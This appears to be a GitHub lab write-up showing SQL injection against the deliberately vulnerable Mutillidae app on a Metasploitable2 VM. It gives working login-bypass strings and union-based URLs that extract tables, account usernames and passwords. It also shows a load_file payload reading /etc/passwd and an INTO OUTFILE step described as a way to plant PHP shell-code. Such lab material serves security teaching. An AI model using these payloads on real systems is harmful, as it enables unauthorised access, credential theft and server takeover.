# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2
#OUTPUT

<img width="817" height="467" alt="image" src="https://github.com/user-attachments/assets/6984eccb-130c-4cbc-80ab-3d7e315cbc52" />


Use the above ip address to access the apache webserver of Metasploitable2 from kali/parrot linux. In Kali Linux use the ip address in a web browser.

<img width="508" height="543" alt="image" src="https://github.com/user-attachments/assets/dc561248-8b2b-47d6-9602-e7a7b89c1ec1" />



Select Multidae from the menu listed as shown above. The page is displayed as below:

<img width="814" height="710" alt="image" src="https://github.com/user-attachments/assets/866f51a7-575a-42df-b235-f8ca7cb4b20b" />


Click on the menu Login/Register and register for an account

<img width="813" height="696" alt="image" src="https://github.com/user-attachments/assets/ffb68a5a-2679-47a2-ac9b-72f3d9cf6f04" />


Click on the link “Please register here”


Click on “Create Account” to display the following page:


<img width="502" height="216" alt="image" src="https://github.com/user-attachments/assets/90be0f31-0f11-4bba-813d-6fefb143002c" />

<img width="563" height="287" alt="image" src="https://github.com/user-attachments/assets/68b8df11-f88e-4844-9217-736b1e3cb53b" />

<img width="812" height="648" alt="image" src="https://github.com/user-attachments/assets/96bad26c-e042-4084-9b01-5ba2c481b984" />

<img width="819" height="416" alt="image" src="https://github.com/user-attachments/assets/24ed33e0-3737-4651-b0b5-53ab9bda5243" />


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

<img width="827" height="139" alt="image" src="https://github.com/user-attachments/assets/37739a96-06ae-4e56-a361-7dfb7622fc8d" />


($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

<img width="817" height="322" alt="image" src="https://github.com/user-attachments/assets/ca88ad49-be4f-43cd-b042-bb09d951e3cc" />


Click “Login”. The logged in page will show as below:

<img width="819" height="326" alt="image" src="https://github.com/user-attachments/assets/c0a49d2e-6385-4166-8c34-37dbd853206b" />


If error faced in registration follow the following steps in metasploitable 2:


This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc
Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]:
cd /
sudo nano /var/www/mutillidae/config.inc
Type msfadmin when prompted for the root password. 
Once nano opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure  below:


Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure




Save and exit the config.inc
Save than exit the config.inc file by typing CTRL+X keys on your keyboard and the Y [Enter] when prompted to save the file
Restart the Apache server
To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM.
sudo /etc/init.d/apache2 reload


# Reset Mutillidae database
Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.





# Test the new configuration
Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

 The Mutillidae database error no longer appears 
#OUTPUT

Now after logging out you will see the login page. In the login page give ganesh’ # (myusername). You can see the page now enters into the administrator page as before when giving the password.
#OUTPUT


<img width="820" height="287" alt="image" src="https://github.com/user-attachments/assets/b3a62c2d-41c6-4b22-8e7a-0e1086e365be" />

<img width="823" height="537" alt="image" src="https://github.com/user-attachments/assets/7ae9d729-860c-4e98-8aea-4cae7014128f" />

<img width="816" height="390" alt="image" src="https://github.com/user-attachments/assets/36168f58-1930-40bc-938d-5c874091211d" />


Click the login button and you will see it enter into the administrator page.



## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:


<img width="579" height="311" alt="image" src="https://github.com/user-attachments/assets/40017fb2-256b-4c61-b12a-af357b7ae7f2" />


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.


As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.


<img width="819" height="416" alt="image" src="https://github.com/user-attachments/assets/a7f98a7e-520b-4b9e-85f2-559318ae357f" />



Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

<img width="827" height="139" alt="image" src="https://github.com/user-attachments/assets/9ba6e236-74ac-4278-9200-e340edd39500" />



The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

<img width="818" height="289" alt="image" src="https://github.com/user-attachments/assets/f59e7bde-7e66-4cf2-943d-f0a59fdb55cb" />

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details


The column names of the accounts is displayed below for the following url:


http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

<img width="834" height="833" alt="image" src="https://github.com/user-attachments/assets/236e558e-7eb7-4065-8aa8-5878f9c206c7" />


Ex: (union select 1,username,password,is_admin,5 from accounts).
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

<img width="816" height="390" alt="image" src="https://github.com/user-attachments/assets/a50bfc18-fb6a-43c8-b985-c6b73b494b56" />


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

<img width="579" height="311" alt="image" src="https://github.com/user-attachments/assets/529efc1a-5616-4ab0-a8e2-33d8f3cea96d" />


Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details



<img width="798" height="551" alt="image" src="https://github.com/user-attachments/assets/14f89291-d055-4c15-94f8-e8871fe7f49e" />

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
